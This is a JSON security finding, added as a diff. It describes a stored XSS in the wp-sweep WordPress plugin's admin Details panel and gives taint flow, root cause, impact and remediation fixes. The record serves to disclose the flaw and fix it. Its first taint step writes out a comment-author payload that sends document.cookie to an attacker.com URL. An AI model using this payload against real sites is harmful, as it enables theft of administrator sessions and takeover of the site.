@@ -1,0 +1,91 @@
+{
+  "id": "wp-sweep-xss-001",
+  "plugin": "wp-sweep",
+  "title": "Stored XSS via Details panel — unescaped comment_author rendered as HTML in admin",
+  "vulnerability_class": "stored_xss",
+  "severity": "medium",
+  "cvss_score": 5.4,
+  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+  "confidence": 0.92,
+  "auth_to_plant": "none (unauthenticated comment submission)",
+  "auth_to_trigger": "activate_plugins capability (WordPress administrator)",
+  "affected_versions": "all known (logic present in current codebase)",
+  "affected_files": [
+    "inc/class-wpsweep.php",
+    "js/wp-sweep.js"
+  ],
+  "root_cause": {
+    "server_file": "inc/class-wpsweep.php",
+    "server_function": "WPSweep::details()",
+    "server_lines": "413-419",
+    "server_issue": "Returns raw unsanitized comment_author values from database via wp_send_json_success()",
+    "client_file": "js/wp-sweep.js",
+    "client_lines": "54-57",
+    "client_issue": "Renders server response items via jQuery .html() using string concatenation with no HTML encoding"
+  },
+  "vulnerable_code": {
+    "server": "case 'unapproved_comments':\n    $details = $wpdb->get_col( $wpdb->prepare( \"SELECT comment_author FROM $wpdb->comments WHERE comment_approved = %s LIMIT %d\", '0', $this->limit_details ) );\n    break;",
+    "client": "$.each(data.data, function(i, n) {\n    html += '<li>' + n + '</li>';\n});\n$( '.sweep-details', $node.parents( 'tr' ) ).html( '<ol>' + html + '</ol>' ).show();"
+  },
+  "taint_flow": [
+    {
+      "step": 1,
+      "actor": "unauthenticated attacker",
+      "action": "POST to wp-comments-post.php with comment_author='<script>fetch(\"https://attacker.com/steal?c=\"+document.cookie)</script>'",
+      "result": "Malicious comment stored in wp_comments with comment_approved='0'"
+    },
+    {
+      "step": 2,
+      "actor": "WordPress administrator",
+      "action": "Navigates to Tools > Sweep, clicks 'Details' button for 'Unapproved Comments' row",
+      "result": "JS sends GET /wp-admin/admin-ajax.php?action=sweep_details&sweep_name=unapproved_comments&_wpnonce=<valid_nonce>"
+    },
+    {
+      "step": 3,
+      "actor": "server",
+      "action": "ajax_sweep_details() verifies nonce and capability, calls details('unapproved_comments')",
+      "result": "SELECT comment_author FROM comments WHERE comment_approved='0' returns malicious payload"
+    },
+    {
+      "step": 4,
+      "actor": "server",
+      "action": "wp_send_json_success($details) returns raw payload without escaping",
+      "result": "JSON response: {\"success\":true,\"data\":[\"<script>...\"]}"
+    },
+    {
+      "step": 5,
+      "actor": "victim browser",
+      "action": "JS iterates data.data and does: html += '<li>' + n + '</li>'; then .html(html)",
+      "result": "Script tag injected into DOM and executed in admin context"
+    }
+  ],
+  "also_affected_sweep_names": [
+    "spam_comments (comment_author from spam queue)",
+    "deleted_comments (comment_author from trash)",
+    "revisions (post_title — requires contributor+ to plant)",
+    "auto_drafts (post_title — requires contributor+ to plant)",
+    "deleted_posts (post_title — requires contributor+ to plant)",
+    "unused_terms (t.name — requires editor+ to plant)",
+    "orphan_postmeta (meta_key — typically not user-controlled but depends on plugins)"
+  ],
+  "impact": "JavaScript execution in WordPress admin session. Attacker can: steal admin cookies/session tokens, create new admin accounts via REST API, install or modify plugins/themes, exfiltrate site data, or pivot to server if WP admin has file edit capabilities.",
+  "exploitation_difficulty": "easy — comment submission requires no authentication, and modern WordPress sites routinely receive spam comments",
+  "false_positive_analysis": {
+    "nonce_check": "Does NOT prevent exploitation — nonce is valid (generated for legitimate admin session, used in their own browser)",
+    "capability_check": "Does NOT prevent exploitation — the triggering admin legitimately has the capability; the attacker exploits the rendering of their stored data",
+    "comment_moderation": "Comments with comment_approved='0' are specifically shown in the Unapproved Comments sweep — admins reviewing this are likely candidates to click Details",
+    "wp_sanitization": "WordPress sanitizes comment_author on front-end display with esc_html() but this AJAX endpoint bypasses that and reads raw DB values"
+  },
+  "remediation": {
+    "preferred_fix": "Server-side: apply esc_html() to each value in WPSweep::details() before returning, or wrap in wp_send_json_success(array_map('esc_html', $details)). This is the most robust fix.",
+    "alternative_fix": "Client-side: in js/wp-sweep.js, replace string concatenation with DOM text node creation: replace `html += '<li>' + n + '</li>'` with DOM manipulation using .text() to set content, preventing HTML interpretation.",
+    "defense_in_depth": "Both server and client fixes should be applied. Server-side escaping ensures safety regardless of how output is consumed. Client-side encoding provides defense-in-depth.",
+    "server_code_fix": "In WPSweep::details(), before the return statement: return apply_filters('wp_sweep_details', array_map('esc_html', $details), $name);",
+    "client_code_fix": "$.each(data.data, function(i, n) { html += '<li>' + $('<span/>').text(n).html() + '</li>'; });"
+  },
+  "references": [
+    "OWASP A03:2021 - Injection (XSS)",
+    "WordPress Security: https://developer.wordpress.org/apis/security/escaping/",
+    "wp_kses_post() and esc_html() for output escaping in WordPress"
+  ]
+}
